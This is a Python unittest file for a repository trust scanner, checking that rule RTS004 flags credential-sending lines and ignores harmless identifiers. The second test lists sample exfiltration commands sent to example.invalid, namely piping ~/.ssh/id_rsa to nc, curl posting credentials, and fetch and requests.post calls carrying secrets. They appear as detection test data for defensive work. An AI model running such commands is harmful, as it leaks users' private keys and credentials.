import unittest
from pathlib import Path

from repo_trust_scan.rules import _scan_text


class TransferBoundaryTests(unittest.TestCase):
    def test_async_and_identifiers_are_not_network_commands(self):
        for text in (
            'const findCredentialsAsync = async () => {};',
            'async invalidateCredentials(scope: string) {}',
            'const credentials = myfetch(value);',
            'const credentials = curlOptions;',
        ):
            with self.subTest(text=text):
                self.assertFalse(any(f.rule_id == 'RTS004' for f in _scan_text(Path('app.ts'), text)))

    def test_real_transfer_tokens_still_match_in_both_orders(self):
        for text in (
            'cat ~/.ssh/id_rsa | nc example.invalid 1234',
            'curl --data @credentials https://example.invalid',
            'fetch("https://example.invalid", {body: credentials})',
            'requests.post("https://example.invalid", data=api_key)',
        ):
            with self.subTest(text=text):
                self.assertTrue(any(f.rule_id == 'RTS004' for f in _scan_text(Path('app.sh'), text)))
